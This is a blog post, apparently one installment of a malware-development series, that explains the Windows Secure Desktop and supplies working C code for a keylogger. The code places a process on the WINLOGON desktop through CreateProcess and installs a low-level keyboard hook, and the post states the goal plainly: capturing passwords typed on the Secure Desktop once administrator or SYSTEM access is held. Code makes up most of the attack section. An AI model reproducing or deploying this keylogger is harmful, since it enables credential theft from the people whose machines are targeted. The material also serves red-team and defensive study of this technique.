# https://0xpat.github.io/Malware_development_part_7/

<!DOCTYPE html><html>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>Malware development part 7 - Secure Desktop keylogger</h1>

  <div class="entry">
    <h2 id="introduction">Introduction</h2>
<p>This is the seventh post of a series which regards the development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.<br>
Today we will talk about “Secure Desktop” on Windows and implement a keylogger.</p>

<h2 id="secure-desktop">Secure Desktop</h2>
<p>Secure Desktop is Windows feature that isolates system processes’ graphical interface elements (like windows, prompts etc.). Basically it’s a different desktop with access limited to system integrity processes.</p>

<p>If UAC is configured to use Secure Desktop (<code class="language-plaintext highlighter-rouge">ConsentPromptBehaviorUser = 1</code> and <code class="language-plaintext highlighter-rouge">ConsentPromptBehaviorAdmin = 1 || 2</code>), consent and credential prompts are presented on this desktop. This protects these prompts from malicious code running with user privileges. Also, <code class="language-plaintext highlighter-rouge">Winlogon</code> process, which handles user logon, run on this desktop.</p>

<p>Actually, <code class="language-plaintext highlighter-rouge">CreateProcess</code> API function allows to create a process assigned to any desktop (given the appropriate permissions are present) with <code class="language-plaintext highlighter-rouge">STARTUPINFO</code> parameter. It goes like this:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STARTUPINFOA</span> <span class="n">startupInfo</span><span class="p">;</span>
<span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">startupInfo</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">startupInfo</span><span class="p">));</span>
<span class="n">startupInfo</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">startupInfo</span><span class="p">);</span>
<span class="n">PROCESS_INFORMATION</span> <span class="n">processInfo</span><span class="p">;</span>
<span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">processInfo</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">processInfo</span><span class="p">));</span>

<span class="kt">char</span> <span class="n">desktop</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"WINSTA0</span><span class="se">\\</span><span class="s">WINLOGON"</span><span class="p">;</span>
<span class="n">startupInfo</span><span class="p">.</span><span class="n">lpDesktop</span> <span class="o">=</span> <span class="n">desktop</span><span class="p">;</span>

<span class="n">CreateProcessA</span><span class="p">(</span><span class="n">currentProcessPath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">startupInfo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">processInfo</span><span class="p">);</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">WINSTA0\DEFAULT</code> is the default desktop and <code class="language-plaintext highlighter-rouge">WINSTA0\WINLOGON</code> is the Secure Desktop.</p>

<h2 id="keylogger">Keylogger</h2>
<p>A regular keylogger running with low user privileges won’t be able to access the Secure Desktop. However if we can elevate to SYSTEM, we will be able to run the keylogger code in the <code class="language-plaintext highlighter-rouge">WINLOGON</code> desktop.</p>

<p>Typical keylogger use <code class="language-plaintext highlighter-rouge">SetWindowsHookEx</code> API with <code class="language-plaintext highlighter-rouge">WH_KEYBOARD_LL</code> hook type which monitors low-level keyboard input events. This function sets a callback function which is called on every event, in this case every keyboard input. Also, low-level hooks use message loop, which is a feature used by windows (GUI) applications to communicate.</p>

<p>From information passed to the hook function we can extract key status - what key was pressed or released. <code class="language-plaintext highlighter-rouge">WM_SYSKEYUP</code> and <code class="language-plaintext highlighter-rouge">WM_SYSKEYDOWN</code> messages are posted when a key is pressed while holding <code class="language-plaintext highlighter-rouge">Alt</code> key.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LRESULT</span> <span class="n">CALLBACK</span> <span class="nf">KeyboardHook</span><span class="p">(</span><span class="kt">int</span> <span class="n">nCode</span><span class="p">,</span> <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">LPARAM</span> <span class="n">lParam</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">KBDLLHOOKSTRUCT</span> <span class="n">kbdStruct</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">KBDLLHOOKSTRUCT</span><span class="o">*</span><span class="p">)</span><span class="n">lParam</span><span class="p">);</span>
	<span class="kt">int</span> <span class="n">msg</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="p">(</span><span class="n">kbdStruct</span><span class="p">.</span><span class="n">scanCode</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">kbdStruct</span><span class="p">.</span><span class="n">flags</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">keyName</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
	<span class="n">GetKeyNameTextA</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">keyName</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">keyState</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
	<span class="k">switch</span> <span class="p">(</span><span class="n">wParam</span><span class="p">)</span>
	<span class="p">{</span>
	<span class="k">case</span> <span class="n">WM_KEYUP</span><span class="p">:</span>
	<span class="n">strncpy</span><span class="p">(</span><span class="n">keyState</span><span class="p">,</span> <span class="s">"Key Up</span><span class="se">\0</span><span class="s">"</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="n">WM_KEYDOWN</span><span class="p">:</span>
	<span class="n">strncpy</span><span class="p">(</span><span class="n">keyState</span><span class="p">,</span> <span class="s">"Key Down</span><span class="se">\0</span><span class="s">"</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="n">WM_SYSKEYUP</span><span class="p">:</span>
	<span class="n">strncpy</span><span class="p">(</span><span class="n">keyState</span><span class="p">,</span> <span class="s">"Sys Key Up</span><span class="se">\0</span><span class="s">"</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="n">WM_SYSKEYDOWN</span><span class="p">:</span>
	<span class="n">strncpy</span><span class="p">(</span><span class="n">keyState</span><span class="p">,</span> <span class="s">"Sys Key Down</span><span class="se">\0</span><span class="s">"</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Captured: %s </span><span class="se">\t</span><span class="s"> %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">keyName</span><span class="p">,</span> <span class="n">keyState</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">CallNextHookEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">nCode</span><span class="p">,</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">lParam</span><span class="p">);;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">SetWindowsHookExA</span><span class="p">(</span><span class="n">WH_KEYBOARD_LL</span><span class="p">,</span> <span class="n">KeyboardHook</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">while</span> <span class="p">(</span><span class="n">GetMessageA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>And that’s about it:</p>

<p><img src="https://0xpat.github.io/images/2021-01-29-Malware_development_part_7/winlogon_keylogger.png" alt="winlogon_keylogger.png"></p>

<h2 id="summary">Summary</h2>
<p>With admin access on a Windows machine we can run a keyloggen on <code class="language-plaintext highlighter-rouge">Winlogon</code> desktop to capture passwords on the Secure Desktop.</p>

  </div>

  <div class="date">
    Written on January 29, 2021
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        
      </div>
    </div>

    

  

</body></html>